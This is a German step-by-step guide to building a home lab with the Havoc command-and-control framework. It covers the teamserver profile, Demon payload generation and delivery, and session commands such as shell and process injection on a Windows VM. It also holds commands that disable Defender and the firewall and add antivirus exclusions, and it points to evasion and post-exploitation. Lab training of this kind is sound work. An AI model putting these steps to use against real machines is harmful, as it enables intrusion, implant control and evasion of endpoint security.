# Lokales PC Setup - Schritt für Schritt

> **Ziel:** Komplette Einrichtung auf Ihrem lokalen PC (Kali Linux/Ubuntu) zum Testen, Lernen und Entwickeln.

---

## 📋 Inhaltsverzeichnis

1. [Übersicht](#übersicht)
2. [Systemanforderungen](#systemanforderungen)
3. [Schritt 1: Kali Linux Installation](#schritt-1-kali-linux-installation)
4. [Schritt 2: Havoc Client Installation](#schritt-2-havoc-client-installation)
5. [Schritt 3: Lokaler Teamserver (Test-Lab)](#schritt-3-lokaler-teamserver-test-lab)
6. [Schritt 4: Windows Test-VM einrichten](#schritt-4-windows-test-vm-einrichten)
7. [Schritt 5: Erste Payload generieren](#schritt-5-erste-payload-generieren)
8. [Schritt 6: Session-Management](#schritt-6-session-management)
9. [Schritt 7: Entwicklungsumgebung](#schritt-7-entwicklungsumgebung)
10. [Troubleshooting](#troubleshooting)

---

## Übersicht

**Was werden Sie erreichen:**

```
┌──────────────────────────────────────────────────────┐
│  Ihr PC (Kali Linux)                                 │
│  ┌────────────────┐         ┌──────────────────┐   │
│  │ Havoc Client   │◄───────►│ Havoc Teamserver │   │
│  │ (GUI)          │         │ (lokal)          │   │
│  └────────────────┘         └─────────┬────────┘   │
│                                        │            │
│                              ┌─────────▼────────┐   │
│                              │ Listener         │   │
│                              │ (localhost:443)  │   │
│                              └─────────┬────────┘   │
└────────────────────────────────────────┼────────────┘
                                         │
                        ┌────────────────▼────────────────┐
                        │ Windows Test-VM (VirtualBox)    │
                        │ ┌──────────────────────────┐    │
                        │ │ Havoc Demon (Payload)    │    │
                        │ └──────────────────────────┘    │
                        └─────────────────────────────────┘
```

**Zeitaufwand:** 2-3 Stunden für komplettes Setup

---

## Systemanforderungen

### Ihr Host-PC:

| Komponente | Minimum | Empfohlen |
|------------|---------|-----------|
| **CPU** | 4 Cores | 8 Cores |
| **RAM** | 8 GB | 16 GB |
| **Storage** | 100 GB | 250 GB SSD |
| **OS** | Kali Linux 2023+ | Kali Linux 2024+ |

**Alternative:** Ubuntu 22.04, Debian 12

---

## Schritt 1: Kali Linux Installation

### Option A: Bare Metal Installation (Empfohlen)

**Download:**
```bash
# Kali Linux ISO herunterladen
wget https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-installer-amd64.iso

# Oder mit Torrent (schneller)
# https://www.kali.org/get-kali/
```

**Bootable USB erstellen:**

**Linux:**
```bash
# Identifiziere USB-Stick
lsblk

# Erstelle bootable USB (VORSICHT: Ersetzt /dev/sdX mit Ihrem USB!)
sudo dd if=kali-linux-2024.1-installer-amd64.iso of=/dev/sdX bs=4M status=progress
sync
```

**Windows:**
- Nutzen Sie **Rufus**: https://rufus.ie/
- Oder **Etcher**: https://www.balena.io/etcher/

**Installation:**
1. Booten Sie von USB
2. Wählen Sie "Graphical Install"
3. Folgen Sie dem Installer
4. Partitionierung: Mindestens 100 GB
5. Desktop Environment: XFCE (leichtgewichtig) oder KDE (modern)
6. Erstellen Sie Benutzer: `operator`
7. Installieren Sie GRUB Bootloader

**Nach Installation:**
```bash
# System aktualisieren
sudo apt update
sudo apt full-upgrade -y
sudo apt dist-upgrade -y

# Neustart
sudo reboot
```

---

### Option B: Kali in VirtualBox

**Download VirtualBox:**
```bash
# Auf Ubuntu/Debian Host:
sudo apt install virtualbox virtualbox-ext-pack

# Oder von: https://www.virtualbox.org/
```

**Kali VM erstellen:**
1. VirtualBox öffnen → "Neu"
2. **Name:** Kali-Operator
3. **Typ:** Linux, **Version:** Debian (64-bit)
4. **RAM:** 4096 MB (minimum), 8192 MB (empfohlen)
5. **Festplatte:** 100 GB dynamisch
6. **Prozessoren:** 4 Cores
7. **Video:** 128 MB VRAM, 3D aktivieren
8. **Netzwerk:** NAT oder Bridged

**Kali installieren:**
- ISO einbinden und VM starten
- Installation wie oben

**Nach Installation (in VM):**
```bash
# Guest Additions installieren
sudo apt update
sudo apt install -y virtualbox-guest-x11
sudo reboot
```

---

## Schritt 2: Havoc Client Installation

### Voraussetzungen installieren

```bash
# System-Update
sudo apt update

# Dependencies
sudo apt install -y git build-essential cmake libfontconfig1 \
    libglu1-mesa-dev qtbase5-dev qtchooser qt5-qmake \
    qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev \
    qtdeclarative5-dev libspdlog-dev python3-dev golang-go
```

### Havoc Framework klonen

```bash
# In /opt installieren (empfohlen)
cd /opt
sudo git clone https://github.com/HavocFramework/Havoc.git
sudo chown -R $USER:$USER /opt/Havoc
cd Havoc
```

### Client kompilieren

```bash
# Client bauen
make client-build

# Dies dauert 5-10 Minuten
# Bei Erfolg: Binary in ./havoc
```

**Test:**
```bash
./havoc client
# GUI sollte sich öffnen
```

### Desktop-Shortcut erstellen (optional)

```bash
cat > ~/.local/share/applications/havoc.desktop << EOF
[Desktop Entry]
Name=Havoc C2 Client
Comment=Havoc Framework Client
Exec=/opt/Havoc/havoc client
Icon=/opt/Havoc/Assets/Havoc.png
Terminal=false
Type=Application
Categories=Development;Security;
EOF

# Icon herunterladen (falls nicht vorhanden)
wget -O /opt/Havoc/Assets/Havoc.png https://avatars.githubusercontent.com/u/90262283
```

---

## Schritt 3: Lokaler Teamserver (Test-Lab)

### Teamserver kompilieren

```bash
cd /opt/Havoc

# Teamserver bauen
make ts-build

# Binary: ./havoc (Server-Binary)
```

### Konfiguration erstellen

```bash
# Profil-Verzeichnis
mkdir -p profiles

# Basis-Konfiguration erstellen
nano profiles/local-lab.yaotl
```

**Inhalt:**

```yaml
Teamserver:
  Host: 0.0.0.0
  Port: 40056
  
  Build:
    Compiler64: "x86_64-w64-mingw32-gcc"
    Compiler86: "i686-w64-mingw32-gcc"
    Nasm: "/usr/bin/nasm"

Operators:
  - Name: operator
    Password: "Test123!"

Listeners:
  - Name: "Local HTTPS"
    Protocol: https
    Hosts:
      - "127.0.0.1"
      - "192.168.1.100"  # Ihre lokale IP (siehe unten)
    Port: 443
    HostBind: 0.0.0.0
    PortBind: 443
    Secure: false  # Für lokale Tests OK
    
    Response:
      Headers:
        Server: "Apache/2.4.41"
        Content-Type: "text/html"

Demons:
  Sleep: 5          # Beacon alle 5 Sekunden (nur für Tests!)
  Jitter: 20        # 20% Jitter
  
  # Injection
  Injection:
    Spawn64: "C:\\Windows\\System32\\notepad.exe"
    Spawn32: "C:\\Windows\\SysWOW64\\notepad.exe"
```

**Ihre lokale IP finden:**

```bash
# Linux
ip addr show | grep "inet " | grep -v 127.0.0.1

# Oder
hostname -I
```

Tragen Sie Ihre IP in `Hosts:` ein (z.B. `192.168.1.100`)

### Teamserver starten

```bash
cd /opt/Havoc

# Manuell starten (für Tests)
sudo ./havoc server --profile ./profiles/local-lab.yaotl -v --debug

# Terminal bleibt offen, zeigt Logs
```

**Sie sollten sehen:**
```
[*] Havoc Framework Teamserver
[+] Loaded profile: local-lab.yaotl
[+] Starting Teamserver on 0.0.0.0:40056
[+] Teamserver started successfully
```

---

## Schritt 4: Windows Test-VM einrichten

### Windows VM herunterladen

Microsoft bietet **kostenlose** Windows 10/11 VMs für Entwickler:

**Download:**
```bash
# Windows 10 Evaluation (gültig 90 Tage)
wget https://aka.ms/windev_VM_virtualbox

# Entpacken
unzip windev*.zip
```

**Oder:** ISO herunterladen und manuell installieren
- Windows 10 ISO: https://www.microsoft.com/software-download/windows10ISO
- Windows 11 ISO: https://www.microsoft.com/software-download/windows11

### VirtualBox VM erstellen

**Import der Development VM:**
1. VirtualBox → Datei → Appliance importieren
2. Wählen Sie `.ova` Datei
3. Importieren

**Oder manuell:**
1. Neue VM: **Name:** Win10-Target
2. **RAM:** 2048 MB
3. **Festplatte:** 50 GB
4. **Netzwerk:** NAT oder Bridged (wichtig!)
5. ISO einbinden, installieren

### Windows konfigurieren

**In der Windows-VM:**

**1. Defender deaktivieren (nur für Lab!):**

```powershell
# PowerShell als Administrator
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
```

**Oder GUI:**
- Windows Security → Virus & threat protection → Manage settings
- Alle Schutzmaßnahmen ausschalten

**2. Firewall deaktivieren (nur für Lab!):**

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

**Oder GUI:**
- Windows Defender Firewall → Turn Windows Defender Firewall on or off
- Alle deaktivieren

**3. Netzwerk testen:**

```powershell
# Ping zu Ihrem Kali-Host
ping 192.168.1.100  # Ihre Kali-IP

# HTTPS-Test
curl https://192.168.1.100
# Sollte SSL-Warnung zeigen (normal für Self-Signed)
```

**⚠️ WICHTIG:** Diese VM NUR für Tests! Niemals produktiv nutzen!

---

## Schritt 5: Erste Payload generieren

### Havoc Client starten

**Neues Terminal auf Kali:**

```bash
cd /opt/Havoc
./havoc client
```

### Mit Teamserver verbinden

1. **Menü:** File → New Profile
2. **Profile Name:** Local Lab
3. **Host:** 127.0.0.1 (oder localhost)
4. **Port:** 40056
5. **User:** operator
6. **Password:** Test123!
7. Klick: **Save**

8. **Rechtsklick** auf Profil → **Connect**

**Erfolgreich wenn:**
- Status zeigt "Connected"
- Unten rechts: Grüner Indikator

### Listener starten

1. **Menü:** View → Listeners
2. **Rechtsklick** auf "Local HTTPS" → **Start**
3. Status sollte "Started" zeigen

### Payload generieren

1. **Menü:** Attack → Payload
2. **Konfiguration:**
   - **Listener:** Local HTTPS
   - **Architecture:** x64
   - **Format:** Windows Exe
   - **Indirect Syscalls:** ✓ (aktiviert)
   - **Sleep Mask:** ✓ (aktiviert)

3. **Generate**
4. **Speichern:** `/home/operator/Downloads/payload.exe`

### Payload auf Windows-VM übertragen

**Option 1: Shared Folder (VirtualBox):**

```bash
# Auf Kali:
# VirtualBox → VM → Settings → Shared Folders
# Add: /home/operator/Downloads → Name: downloads

# In Windows-VM:
# Öffne Explorer → \\VBOXSVR\downloads\payload.exe
```

**Option 2: Python HTTP Server:**

```bash
# Auf Kali:
cd ~/Downloads
python3 -m http.server 8000

# In Windows-VM Browser:
http://192.168.1.100:8000/payload.exe
# Download
```

**Option 3: SCP (wenn SSH aktiviert):**

```bash
scp payload.exe user@WINDOWS_IP:C:\Users\user\Desktop\
```

---

## Schritt 6: Session-Management

### Payload ausführen

**In Windows-VM:**

1. Öffne Downloads-Ordner
2. **Rechtsklick** auf `payload.exe` → **Run as Administrator**
   (oder Doppelklick)

**⚠️ Defender-Warnung?**
- "More info" → "Run anyway"

### Session erscheint!

**Im Havoc Client:**

- **View → Sessions** (oder Tab "Sessions")
- Nach 5-10 Sekunden sollte Session erscheinen:
  - **Computer:** WIN10-TARGET
  - **User:** Administrator (oder Ihr Username)
  - **Domain:** WORKGROUP
  - **OS:** Windows 10 x64

### Mit Session interagieren

**Rechtsklick auf Session → Interact**

**Kommando-Terminal öffnet sich:**

```
Demon> help
# Zeigt alle verfügbaren Kommandos

Demon> whoami
# WIN10-TARGET\Administrator

Demon> pwd
# Zeigt aktuelles Verzeichnis

Demon> shell whoami /all
# Führt Windows-Kommando aus

Demon> ps
# Zeigt Prozesse

Demon> sleep 10 30
# Ändere Beacon-Intervall: 10 Sekunden, 30% Jitter
```

### File Browser

**Rechtsklick auf Session → Explore**

- GUI-Datei-Browser
- Download/Upload Dateien
- Rechtsklick auf Dateien für Optionen

### Process List

```
Demon> ps
# Liste aller Prozesse

Demon> inject 1234
# Injiziere Demon in Prozess mit PID 1234
# Empfohlen: explorer.exe, notepad.exe
```

---

## Schritt 7: Entwicklungsumgebung

### Code-Editor installieren

**Visual Studio Code:**

```bash
# Auf Kali:
wget https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64 -O vscode.deb
sudo dpkg -i vscode.deb
sudo apt --fix-broken install -y

# Starten
code
```

**Extensions installieren:**
- C/C++ (Microsoft)
- Python
- Go
- YAML

### Havoc Source Code erkunden

```bash
cd /opt/Havoc
code .

# Wichtige Verzeichnisse:
# - teamserver/: Teamserver-Code (Go)
# - client/: Client-Code (C++/Qt)
# - payloads/Demon/: Demon-Agent-Code (C)
```

### Dokumentation durcharbeiten

**Lokale Doku öffnen:**

```bash
cd /workspace  # Ihr Repository
code .

# Lesen Sie in dieser Reihenfolge:
# 1. README.md
# 2. HAVOC_C2_SETUP.md
# 3. PAYLOAD_DEVELOPMENT.md (siehe nächster Guide)
# 4. POST_EXPLOITATION.md (siehe nächster Guide)
```

### Debugger einrichten

**GDB (für C/C++ Debugging):**

```bash
sudo apt install gdb gdb-multiarch

# GEF (GDB Enhanced Features)
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"

# Pwndbg (Alternative)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```

**x64dbg (für Windows-Debugging):**

Läuft in Windows-VM:
- Download: https://x64dbg.com/
- Zum Analysieren von Payloads

---

## Workflow-Checkliste

### Täglicher Lab-Workflow:

**1. Start:**
```bash
# Terminal 1: Teamserver
cd /opt/Havoc
sudo ./havoc server --profile ./profiles/local-lab.yaotl -v --debug

# Terminal 2: Client
cd /opt/Havoc
./havoc client
# Connect zu Teamserver
```

**2. Entwicklung:**
- Code ändern in `/opt/Havoc/payloads/Demon/`
- Recompile: `make ts-build` (wenn Teamserver-Änderungen)
- Teamserver neu starten
- Neue Payload generieren

**3. Testing:**
- Payload auf Windows-VM übertragen
- Ausführen
- Session-Testing
- Logs prüfen

**4. Cleanup:**
```bash
# Session beenden
Demon> exit

# In Windows-VM: Prozess killen
taskkill /F /IM payload.exe

# Logs rotieren
sudo journalctl --rotate --vacuum-time=1d
```

---

## Erweiterte Szenarien

### Szenario 1: Mehrere Test-VMs

**Setup:**
- Windows 10 VM (Primary Target)
- Windows 11 VM (Secondary Target)
- Ubuntu Server VM (Linux Target - für später)

**Netzwerk:**
- Alle VMs im gleichen Netzwerk (Bridged oder Internal Network)
- Lateral Movement zwischen VMs üben

### Szenario 2: Simulated Network

**pfSense als Router:**

```
┌─────────────────────────────────────────┐
│  Kali (Attacker)                        │
│  192.168.0.10                           │
└───────────────┬─────────────────────────┘
                │
        ┌───────▼────────┐
        │  pfSense       │
        │  (Firewall)    │
        │  192.168.0.1   │
        └───────┬────────┘
                │
        ┌───────┴────────┐
        │                │
   ┌────▼────┐     ┌────▼────┐
   │  Win10  │     │  Win11  │
   │ Target1 │     │ Target2 │
   └─────────┘     └─────────┘
```

**VMs:**
- pfSense: Firewall-Simulation
- Konfiguriere Firewall-Regeln
- Üben von Firewall-Evasion

---

## Troubleshooting

### Problem: Teamserver startet nicht

```bash
# Port bereits belegt?
sudo netstat -tlnp | grep 40056

# Falls ja: Prozess killen
sudo pkill -9 havoc

# Oder anderen Port nutzen (in yaotl ändern)
```

### Problem: Client kann sich nicht verbinden

```bash
# Firewall?
sudo ufw status
sudo ufw allow 40056/tcp

# Teamserver läuft?
ps aux | grep havoc

# Netzwerk-Test
nc -zv 127.0.0.1 40056
```

### Problem: Session verbindet nicht

**Checklist:**
- [ ] Listener gestartet? (View → Listeners, Status: "Started")
- [ ] Windows Firewall aus?
- [ ] Windows Defender aus?
- [ ] Netzwerk erreichbar? (Ping Kali von Windows)
- [ ] Payload mit korrekter IP generiert?

**Debugging:**

```bash
# Teamserver-Logs ansehen (Terminal 1)
# Sollte zeigen: "New connection from ..."

# In Havoc Client: View → Logs
# Prüfe auf Fehler
```

### Problem: Payload wird sofort von Defender gelöscht

**Lösungen:**

**1. Defender komplett deaktivieren:**
```powershell
# In Windows-VM als Admin:
Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

# Neustart
Restart-Computer
```

**2. Exclusion hinzufügen:**
```powershell
Add-MpPreference -ExclusionPath "C:\Users\$env:USERNAME\Downloads"
Add-MpPreference -ExclusionExtension "exe"
```

**3. Payload obfuskieren** (siehe PAYLOAD_DEVELOPMENT.md)

### Problem: VM-Performance schlecht

**VirtualBox-Optimierung:**

```bash
# Mehr RAM zuweisen (mind. 4 GB für Windows)
# VirtualBox → Settings → System → Base Memory: 4096 MB

# Mehr CPU-Cores (mind. 2)
# System → Processor: 2 CPUs

# 3D-Beschleunigung aktivieren
# Display → Video Memory: 128 MB
# Display → Enable 3D Acceleration: ✓

# Nested Virtualization (falls auf Linux-Host)
vboxmanage modifyvm "Win10-Target" --nested-hw-virt on
```

---

## Nächste Schritte

Nach erfolgreichem lokalem Setup:

1. **✅ Sie haben jetzt:**
   - Funktionierendes Havoc Lab
   - Test-Windows-VM
   - Erste Session erfolgreich

2. **📖 Weiterlesen:**
   - **[PAYLOAD_DEVELOPMENT.md](PAYLOAD_DEVELOPMENT.md)** - Eigene Payloads entwickeln
   - **[POST_EXPLOITATION.md](POST_EXPLOITATION.md)** - Techniken nach Compromise
   - **[HAVOC_C2_SETUP.md](HAVOC_C2_SETUP.md)** - Production-Deployment

3. **🚀 Üben:**
   - Verschiedene Payload-Formate testen
   - Process Injection üben
   - Privilege Escalation
   - Lateral Movement (mit mehreren VMs)

---

## Ressourcen

**Havoc:**
- GitHub: https://github.com/HavocFramework/Havoc
- Docs: https://havocframework.com/docs
- Discord: https://discord.gg/havoc

**Kali Linux:**
- Docs: https://www.kali.org/docs/
- Tools: https://www.kali.org/tools/

**Windows Eval VMs:**
- Download: https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/

**Learning Resources:**
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/

---

**Viel Erfolg beim Lernen! 🎯**

**Erstellt:** 2026-02-05  
**Version:** 1.0
